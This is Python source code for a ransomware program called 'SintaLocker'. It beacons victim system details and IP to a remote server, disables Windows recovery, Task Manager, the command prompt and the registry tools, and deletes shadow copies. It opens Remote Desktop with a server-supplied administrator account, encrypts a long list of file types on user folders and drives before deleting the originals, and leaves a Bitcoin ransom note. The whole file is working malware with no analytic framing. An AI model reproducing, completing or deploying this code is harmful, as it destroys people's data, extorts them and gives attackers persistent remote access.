import os, fnmatch, struct, random, string, base64, platform, sys, time, socket, json, urllib, ctypes, urllib2
import SintaRegistery
import SintaChangeWallpaper
from Crypto import Random
from Crypto.Cipher import AES
rmsbrand = 'SintaLocker'
newextns = 'sinta'
encfolder = '__SINTA I LOVE YOU__'
email_con = 'sinpayy@yandex.com'
btc_address = '1NEdFjQN74ZKszVebFum8KFJNd9oayHFT1'
userhome = os.path.expanduser('~')
my_server = 'http://www.dobrebaseny.pl/js/lib/srv/'
wallpaper_link = 'http://wallpaperrs.com/uploads/girls/thumbs/mood-ravishing-hd-wallpaper-142943312215.jpg'
victim_info = base64.b64encode(str(platform.uname()))
configurl = my_server + 'api.php?info=' + victim_info + '&ip=' + base64.b64encode(socket.gethostbyname(socket.gethostname()))
glob_config = None
try:
    glob_config = json.loads(urllib.urlopen(configurl).read())
    if set(glob_config.keys()) != set(['MRU_ID', 'MRU_UDP', 'MRU_PDP']):
        raise Exception('0x00001')
except IOError:
    time.sleep(1)

victim_id = glob_config[u'MRU_ID']
victim_r = glob_config[u'MRU_UDP']
victim_s = glob_config[u'MRU_PDP']
try:
    os.system('bcdedit /set {default} recoveryenabled No')
    os.system('bcdedit /set {default} bootstatuspolicy ignoreallfailures')
    os.system('REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_DWORD /v DisableRegistryTools /d 1 /f')
    os.system('REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_DWORD /v DisableTaskMgr /d 1 /f')
    os.system('REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_DWORD /v DisableCMD /d 1 /f')
    os.system('REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /t REG_DWORD /v NoRun /d 1 /f')
except WindowsError:
    pass

def setWallpaper(imageUrl):
    try:
        wallpaper = SintaChangeWallpaper.ChangeWallpaper()
        wallpaper.downloadWallpaper(imageUrl)
    except:
        pass


def persistance():
    try:
        SintaRegistery.addRegistery(os.path.realpath(__file__))
    except:
        pass


def destroy_shadow_copy():
    try:
        os.system('vssadmin Delete Shadows /All /Quiet')
    except:
        pass


def create_remote_desktop():
    try:
        os.system('REG ADD HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 0 /f')
        os.system('net user ' + victim_r + ' ' + victim_s + ' /add')
        os.system('net localgroup administrators ' + victim_r + ' /add')
    except:
        pass


def write_instruction(dir, ext):
    try:
        files = open(dir + '\\README_FOR_DECRYPT.' + ext, 'w')
        files.write('! ! ! OWNED BY ' + rmsbrand + ' ! ! !\r\n\r\nAll your files are encrypted by ' + rmsbrand + ' with strong chiphers.\r\nDecrypting of your files is only possible with the decryption program, which is on our secret server.\r\nAll encrypted files are moved to ' + encfolder + ' directory and renamed to unique random name.\r\nTo receive your decryption program send $100 USD Bitcoin to address: ' + btc_address + '\r\nContact us after you send the money: ' + email_con + '\r\n\r\nJust inform your identification ID and we will give you next instruction.\r\nYour personal identification ID: ' + victim_id + '\r\n\r\nAs your partner,\r\n\r\n' + rmsbrand + '')
    except:
        pass


def delete_file(filename):
    try:
        os.remove(filename)
    except:
        pass


def find_files(root_dir):
    write_instruction(root_dir, 'md')
    extentions = ['*.txt',
     '*.exe',
     '*.php',
     '*.pl',
     '*.7z',
     '*.rar',
     '*.m4a',
     '*.wma',
     '*.avi',
     '*.wmv',
     '*.csv',
     '*.d3dbsp',
     '*.sc2save',
     '*.sie',
     '*.sum',
     '*.ibank',
     '*.t13',
     '*.t12',
     '*.qdf',
     '*.gdb',
     '*.tax',
     '*.pkpass',
     '*.bc6',
     '*.bc7',
     '*.bkp',
     '*.qic',
     '*.bkf',
     '*.sidn',
     '*.sidd',
     '*.mddata',
     '*.itl',
     '*.itdb',
     '*.icxs',
     '*.hvpl',
     '*.hplg',
     '*.hkdb',
     '*.mdbackup',
     '*.syncdb',
     '*.gho',
     '*.cas',
     '*.svg',
     '*.map',
     '*.wmo',
     '*.itm',
     '*.sb',
     '*.fos',
     '*.mcgame',
     '*.vdf',
     '*.ztmp',
     '*.sis',
     '*.sid',
     '*.ncf',
     '*.menu',
     '*.layout',
     '*.dmp',
     '*.blob',
     '*.esm',
     '*.001',
     '*.vtf',
     '*.dazip',
     '*.fpk',
     '*.mlx',
     '*.kf',
     '*.iwd',
     '*.vpk',
     '*.tor',
     '*.psk',
     '*.rim',
     '*.w3x',
     '*.fsh',
     '*.ntl',
     '*.arch00',
     '*.lvl',
     '*.snx',
     '*.cfr',
     '*.ff',
     '*.vpp_pc',
     '*.lrf',
     '*.m2',
     '*.mcmeta',
     '*.vfs0',
     '*.mpqge',
     '*.kdb',
     '*.db0',
     '*.mp3',
     '*.upx',
     '*.rofl',
     '*.hkx',
     '*.bar',
     '*.upk',
     '*.das',
     '*.iwi',
     '*.litemod',
     '*.asset',
     '*.forge',
     '*.ltx',
     '*.bsa',
     '*.apk',
     '*.re4',
     '*.sav',
     '*.lbf',
     '*.slm',
     '*.bik',
     '*.epk',
     '*.rgss3a',
     '*.pak',
     '*.big',
     '*.unity3d',
     '*.wotreplay',
     '*.xxx',
     '*.desc',
     '*.py',
     '*.m3u',
     '*.flv',
     '*.js',
     '*.css',
     '*.rb',
     '*.png',
     '*.jpeg',
     '*.p7c',
     '*.p7b',
     '*.p12',
     '*.pfx',
     '*.pem',
     '*.crt',
     '*.cer',
     '*.der',
     '*.x3f',
     '*.srw',
     '*.pef',
     '*.ptx',
     '*.r3d',
     '*.rw2',
     '*.rwl',
     '*.raw',
     '*.raf',
     '*.orf',
     '*.nrw',
     '*.mrwref',
     '*.mef',
     '*.erf',
     '*.kdc',
     '*.dcr',
     '*.cr2',
     '*.crw',
     '*.bay',
     '*.sr2',
     '*.srf',
     '*.arw',
     '*.3fr',
     '*.dng',
     '*.jpeg',
     '*.jpg',
     '*.cdr',
     '*.indd',
     '*.ai',
     '*.eps',
     '*.pdf',
     '*.pdd',
     '*.psd',
     '*.dbfv',
     '*.mdf',
     '*.wb2',
     '*.rtf',
     '*.wpd',
     '*.dxg',
     '*.xf',
     '*.dwg',
     '*.pst',
     '*.accdb',
     '*.mdb',
     '*.pptm',
     '*.pptx',
     '*.ppt',
     '*.xlk',
     '*.xlsb',
     '*.xlsm',
     '*.xlsx',
     '*.xls',
     '*.wps',
     '*.docm',
     '*.docx',
     '*.doc',
     '*.odb',
     '*.odc',
     '*.odm',
     '*.odp',
     '*.ods',
     '*.odt',
     '*.sql',
     '*.zip',
     '*.tar',
     '*.tar.gz',
     '*.tgz',
     '*.biz',
     '*.ocx',
     '*.html',
     '*.htm',
     '*.3gp',
     '*.srt',
     '*.cpp',
     '*.mid',
     '*.mkv',
     '*.mov',
     '*.asf',
     '*.mpeg',
     '*.vob',
     '*.mpg',
     '*.fla',
     '*.swf',
     '*.wav',
     '*.qcow2',
     '*.vdi',
     '*.vmdk',
     '*.vmx',
     '*.gpg',
     '*.aes',
     '*.ARC',
     '*.PAQ',
     '*.tar.bz2',
     '*.tbk',
     '*.bak',
     '*.djv',
     '*.djvu',
     '*.bmp',
     '*.cgm',
     '*.tif',
     '*.tiff',
     '*.NEF',
     '*.cmd',
     '*.class',
     '*.jar',
     '*.java',
     '*.asp',
     '*.brd',
     '*.sch',
     '*.dch',
     '*.dip',
     '*.vbs',
     '*.asm',
     '*.pas',
     '*.ldf',
     '*.ibd',
     '*.MYI',
     '*.MYD',
     '*.frm',
     '*.dbf',
     '*.SQLITEDB',
     '*.SQLITE3',
     '*.asc',
     '*.lay6',
     '*.lay',
     '*.ms11 (Security copy)',
     '*.sldm',
     '*.sldx',
     '*.ppsm',
     '*.ppsx',
     '*.ppam',
     '*.docb',
     '*.mml',
     '*.sxm',
     '*.otg',
     '*.slk',
     '*.xlw',
     '*.xlt',
     '*.xlm',
     '*.xlc',
     '*.dif',
     '*.stc',
     '*.sxc',
     '*.ots',
     '*.ods',
     '*.hwp',
     '*.dotm',
     '*.dotx',
     '*.docm',
     '*.DOT',
     '*.max',
     '*.xml',
     '*.uot',
     '*.stw',
     '*.sxw',
     '*.ott',
     '*.csr',
     '*.key',
     'wallet.dat']
    for dirpath, dirs, files in os.walk(root_dir):
        if 'Windows' not in dirpath:
            for basename in files:
                for ext in extentions:
                    if fnmatch.fnmatch(basename, ext):
                        filename = os.path.join(dirpath, basename)
                        yield filename


def make_directory(file_path):
    directory = file_path + '' + encfolder
    if not os.path.exists(directory):
        try:
            os.makedirs(directory)
        except:
            pass


def text_generator(size = 6, chars = string.ascii_uppercase + string.digits):
    return ''.join((random.choice(chars) for _ in range(size))) + '.' + newextns


def generate_file(file_path, filename):
    make_directory(file_path)
    key = ''.join([ random.choice(string.ascii_letters + string.digits) for n in xrange(32) ])
    newfilename = file_path + '\\' + encfolder + '\\' + text_generator(36, '1234567890QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm')
    try:
        encrypt_file(key, filename, newfilename)
    except:
        pass


def encrypt_file(key, in_filename, newfilename, out_filename = None, chunksize = 65536, Block = 16):
    if not out_filename:
        out_filename = newfilename
    iv = ''.join((chr(random.randint(0, 255)) for i in range(16)))
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    filesize = os.path.getsize(in_filename)
    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(struct.pack('<Q', filesize))
            outfile.write(iv)
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += ' ' * (16 - len(chunk) % 16)
                outfile.write(encryptor.encrypt(chunk))


listdir = (userhome + '\\Contacts\\',
 userhome + '\\Documents\\',
 userhome + '\\Downloads\\',
 userhome + '\\Favorites\\',
 userhome + '\\Links\\',
 userhome + '\\My Documents\\',
 userhome + '\\My Music\\',
 userhome + '\\My Pictures\\',
 userhome + '\\My Videos\\',
 'D:\\',
 'E:\\',
 'F:\\',
 'G:\\',
 'I:\\',
 'J:\\',
 'K:\\',
 'L:\\',
 'M:\\',
 'N:\\',
 'O:\\',
 'P:\\',
 'Q:\\',
 'R:\\',
 'S:\\',
 'T:\\',
 'U:\\',
 'V:\\',
 'W:\\',
 'X:\\',
 'Y:\\',
 'Z:\\')
for dir_ in listdir:
    for filename in find_files(dir_):
        generate_file(dir_, filename)
        delete_file(filename)

persistance()
destroy_shadow_copy()
create_remote_desktop()
write_instruction(userhome + '\\Desktop\\', 'txt')
os.startfile(userhome + '\\Desktop\\README_FOR_DECRYPT.txt')
setWallpaper(wallpaper_link)
